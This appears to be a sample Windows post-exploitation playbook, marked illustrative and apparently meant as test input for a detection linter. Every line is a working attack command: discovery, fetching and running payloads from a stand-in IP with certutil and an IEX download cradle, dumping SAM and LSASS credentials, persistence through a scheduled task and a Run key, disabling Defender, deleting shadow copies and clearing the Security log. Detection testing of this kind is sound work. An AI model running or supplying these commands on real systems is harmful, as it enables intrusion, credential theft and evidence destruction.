# Sample Windows post-exploitation playbook. Illustrative only.
# Analyze with: opseclint examples/windows-postex.ps1 --platform windows-sysmon

# Discovery
whoami /priv
systeminfo
net user /domain
nltest /domain_trusts

# Tool ingress (LOLBins)
certutil.exe -urlcache -f http://198.51.100.10/a.exe a.exe
powershell -nop -w hidden -enc SQBFAFgA...
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.10/s.ps1')

# Credential access
reg save hklm\sam sam.hive
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 660 lsass.dmp full

# Persistence
schtasks /create /tn Updater /tr C:\ProgramData\beacon.exe /sc onlogon
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\ProgramData\beacon.exe

# Defense evasion / anti-forensics
Set-MpPreference -DisableRealtimeMonitoring $true
vssadmin delete shadows /all /quiet
wevtutil cl Security
